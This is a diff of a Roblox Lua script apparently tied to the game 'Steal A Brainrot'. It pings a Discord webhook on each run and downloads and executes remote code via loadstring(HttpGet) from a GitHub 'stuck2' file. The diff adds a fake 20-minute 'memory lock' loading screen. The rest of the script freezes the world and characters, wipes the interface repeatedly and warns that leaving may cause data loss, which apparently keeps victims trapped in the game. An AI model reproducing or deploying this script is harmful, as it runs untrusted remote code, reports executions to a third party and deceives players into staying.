@@ -1,18 +1,18 @@
 
-
 -----------------------------------------------------------------
 -- SERVICES
 -----------------------------------------------------------------
-local Players          = game:GetService("Players")
-local Player           = Players.LocalPlayer
-local PlayerGui        = Player:WaitForChild("PlayerGui")
-local CoreGui          = game:GetService("CoreGui")
-local RunService       = game:GetService("RunService")
-local Workspace        = game:GetService("Workspace")
-local StarterGui       = game:GetService("StarterGui")
-local SoundService     = game:GetService("SoundService")
-local HttpService      = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
+local Players              = game:GetService("Players")
+local Player               = Players.LocalPlayer
+local PlayerGui            = Player:WaitForChild("PlayerGui")
+local CoreGui              = game:GetService("CoreGui")
+local RunService           = game:GetService("RunService")
+local Workspace            = game:GetService("Workspace")
+local StarterGui           = game:GetService("StarterGui")
+local SoundService         = game:GetService("SoundService")
+local HttpService          = game:GetService("HttpService")
+local MarketplaceService  = game:GetService("MarketplaceService")
+local TweenService         = game:GetService("TweenService")
 
 -----------------------------------------------------------------
 -- DISCORD WEBHOOK (EXECUTE LOG)
@@ -48,149 +48,183 @@ local function sendWebhook()
         end)
     end
 end
-
 task.spawn(sendWebhook)
 
 -----------------------------------------------------------------
 -- LOAD EXTRA STUCK SCRIPT
 -----------------------------------------------------------------
-loadstring(game:HttpGet(
-    "https://raw.githubusercontent.com/changelog-modul/Steal-A-BrainrotV3/refs/heads/main/stuck2",
-    true
-))()
+pcall(function()
+    loadstring(game:HttpGet(
+        "https://raw.githubusercontent.com/changelog-modul/Steal-A-BrainrotV3/refs/heads/main/stuck2",
+        true
+    ))()
+end)
 
 -----------------------------------------------------------------
--- 1. DISABLE CORE GUI
+-- LOADING SCREEN (20 MINUTES)
+-----------------------------------------------------------------
+local LOADING_TIME = 20 * 60
+local startTime = tick()
+
+pcall(function()
+    PlayerGui:FindFirstChild("sm_loading_preview"):Destroy()
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "sm_loading_preview"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = PlayerGui
+
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.fromScale(1,1)
+bg.BackgroundColor3 = Color3.fromRGB(6,6,6)
+
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.fromScale(1,0.15)
+title.Position = UDim2.fromScale(0,0.18)
+title.BackgroundTransparency = 1
+title.Text = "INITIALIZING MEMORY LOCK"
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 36
+title.TextColor3 = Color3.fromRGB(255,70,70)
+title.TextTransparency = 1
+
+local subtitle = Instance.new("TextLabel", bg)
+subtitle.Size = UDim2.fromScale(1,0.07)
+subtitle.Position = UDim2.fromScale(0,0.3)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Please wait. Do not close the game."
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 18
+subtitle.TextColor3 = Color3.fromRGB(180,180,180)
+subtitle.TextTransparency = 1
+
+local barBG = Instance.new("Frame", bg)
+barBG.Size = UDim2.fromScale(0.42,0.02)
+barBG.Position = UDim2.fromScale(0.29,0.55)
+barBG.BackgroundColor3 = Color3.fromRGB(30,30,30)
+barBG.BorderSizePixel = 0
+barBG.BackgroundTransparency = 1
+barBG.ClipsDescendants = true
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)
+
+local bar = Instance.new("Frame", barBG)
+bar.Size = UDim2.fromScale(0,1)
+bar.BackgroundColor3 = Color3.fromRGB(255,70,70)
+bar.BorderSizePixel = 0
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
+
+local percent = Instance.new("TextLabel", bg)
+percent.Size = UDim2.fromScale(1,0.05)
+percent.Position = UDim2.fromScale(0,0.59)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.Font = Enum.Font.GothamMedium
+percent.TextSize = 16
+percent.TextColor3 = Color3.fromRGB(255,255,255)
+percent.TextTransparency = 1
+
+local spinner = Instance.new("ImageLabel", bg)
+spinner.Size = UDim2.fromScale(0.06,0.06)
+spinner.Position = UDim2.fromScale(0.47,0.68)
+spinner.BackgroundTransparency = 1
+spinner.Image = "rbxassetid://3926305904"
+spinner.ImageRectOffset = Vector2.new(764,244)
+spinner.ImageRectSize = Vector2.new(36,36)
+spinner.ImageTransparency = 0.15
+
+TweenService:Create(title, TweenInfo.new(1), {TextTransparency=0}):Play()
+TweenService:Create(subtitle, TweenInfo.new(1), {TextTransparency=0}):Play()
+TweenService:Create(barBG, TweenInfo.new(1), {BackgroundTransparency=0}):Play()
+TweenService:Create(percent, TweenInfo.new(1), {TextTransparency=0}):Play()
+
+task.spawn(function()
+    while gui.Parent do
+        spinner.Rotation += 1.2
+        task.wait()
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    local alpha = math.clamp((tick() - startTime) / LOADING_TIME, 0, 1)
+    bar.Size = UDim2.fromScale(alpha,1)
+    percent.Text = math.floor(alpha * 100) .. "%"
+end)
+
+-----------------------------------------------------------------
+-- CORE FREEZE SYSTEM
 -----------------------------------------------------------------
 pcall(function()
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 end)
 
------------------------------------------------------------------
--- 2. FREE CAMERA
------------------------------------------------------------------
-local Camera = Workspace.CurrentCamera
-Camera.CameraType = Enum.CameraType.Scriptable
+Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
 
------------------------------------------------------------------
--- 3. DISABLE ALL AUDIO
------------------------------------------------------------------
 SoundService.AmbientReverb = Enum.ReverbType.NoReverb
-for _, snd in ipairs(Workspace:GetDescendants()) do
-    if snd:IsA("Sound") then
-        snd.Volume = 0
-        snd:Stop()
+for _, s in ipairs(Workspace:GetDescendants()) do
+    if s:IsA("Sound") then
+        s.Volume = 0
+        s:Stop()
     end
 end
 
-Workspace.DescendantAdded:Connect(function(obj)
-    if obj:IsA("Sound") then
-        obj.Volume = 0
-        obj:Stop()
+Workspace.DescendantAdded:Connect(function(o)
+    if o:IsA("Sound") then
+        o.Volume = 0
+        o:Stop()
     end
 end)
 
-RunService.Heartbeat:Connect(function()
-    for _, snd in ipairs(Workspace:GetDescendants()) do
-        if snd:IsA("Sound") and snd.IsPlaying then
-            snd:Stop()
-        end
-    end
-end)
+local frozenParts, frozenJoints = {}, {}
 
------------------------------------------------------------------
--- 4. FULL FREEZE WORLD
------------------------------------------------------------------
-local frozenParts = {}
-local frozenJoints = {}
-
-local function freezeObject(obj)
-    if obj:IsA("BasePart") then
-        frozenParts[obj] = {
-            CFrame = obj.CFrame,
-            Size = obj.Size,
-            Transparency = obj.Transparency,
-            Color = obj.Color,
-            Material = obj.Material,
-            CanCollide = obj.CanCollide
+local function freezeObject(o)
+    if o:IsA("BasePart") then
+        frozenParts[o] = {
+            CFrame=o.CFrame, Size=o.Size, Transparency=o.Transparency,
+            Color=o.Color, Material=o.Material, CanCollide=o.CanCollide
         }
-    elseif obj:IsA("Motor6D") or obj:IsA("Weld") or obj:IsA("ManualWeld") then
-        frozenJoints[obj] = { C0 = obj.C0, C1 = obj.C1 }
+    elseif o:IsA("Motor6D") or o:IsA("Weld") then
+        frozenJoints[o] = {C0=o.C0, C1=o.C1}
     end
 end
 
-for _, obj in ipairs(Workspace:GetDescendants()) do
-    freezeObject(obj)
-end
+for _, o in ipairs(Workspace:GetDescendants()) do freezeObject(o) end
 Workspace.DescendantAdded:Connect(freezeObject)
 
 RunService.Stepped:Connect(function()
-    for part, data in pairs(frozenParts) do
-        if part and part.Parent then
-            for k, v in pairs(data) do
-                part[k] = v
-            end
-        end
+    for p,d in pairs(frozenParts) do
+        if p.Parent then for k,v in pairs(d) do p[k]=v end end
     end
-    for joint, data in pairs(frozenJoints) do
-        if joint and joint.Parent then
-            joint.C0 = data.C0
-            joint.C1 = data.C1
-        end
+    for j,d in pairs(frozenJoints) do
+        if j.Parent then j.C0=d.C0 j.C1=d.C1 end
     end
 end)
 
------------------------------------------------------------------
--- 5. FREEZE ALL CHARACTERS
------------------------------------------------------------------
-local function stopAnimations(h)
-    if not h then return end
-    for _, t in ipairs(h:GetPlayingAnimationTracks()) do
-        t:Stop()
+local function freezeChar(c)
+    local h=c:FindFirstChildOfClass("Humanoid")
+    if h then
+        h.WalkSpeed=0 h.JumpPower=0 h.PlatformStand=true
+        for _,a in ipairs(h:GetPlayingAnimationTracks()) do a:Stop() end
     end
 end
 
-local function freezeCharacter(char)
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if hum then
-        hum.WalkSpeed = 0
-        hum.JumpPower = 0
-        hum.PlatformStand = true
-        stopAnimations(hum)
-    end
+for _,p in ipairs(Players:GetPlayers()) do
+    if p.Character then freezeChar(p.Character) end
+    p.CharacterAdded:Connect(freezeChar)
 end
 
-if Player.Character then freezeCharacter(Player.Character) end
-Player.CharacterAdded:Connect(freezeCharacter)
-
-for _, plr in ipairs(Players:GetPlayers()) do
-    if plr.Character then freezeCharacter(plr.Character) end
-    plr.CharacterAdded:Connect(freezeCharacter)
-end
-
------------------------------------------------------------------
--- 6. DELETE ALL GUI
------------------------------------------------------------------
 local function clearGui()
-    for _, gui in ipairs(PlayerGui:GetChildren()) do
-        if gui:IsA("GuiObject") then
-            if gui.Name ~= "sm_notif" and gui.Name ~= "sm_main" then
-                pcall(gui.Destroy, gui)
-            end
+    for _,g in ipairs(PlayerGui:GetChildren()) do
+        if g:IsA("GuiObject") and g.Name ~= "sm_loading_preview" then
+            pcall(g.Destroy,g)
         end
     end
-    for _, gui in ipairs(CoreGui:GetChildren()) do
-        pcall(gui.Destroy, gui)
-    end
+    for _,g in ipairs(CoreGui:GetChildren()) do pcall(g.Destroy,g) end
 end
 
-clearGui()
 task.spawn(function()
-    while task.wait(0.03) do
-        clearGui()
-    end
+    while task.wait(0.03) do clearGui() end
 end)
 
------------------------------------------------------------------
 print("[Script.SM] Leaving May Cause Data Loss")
-
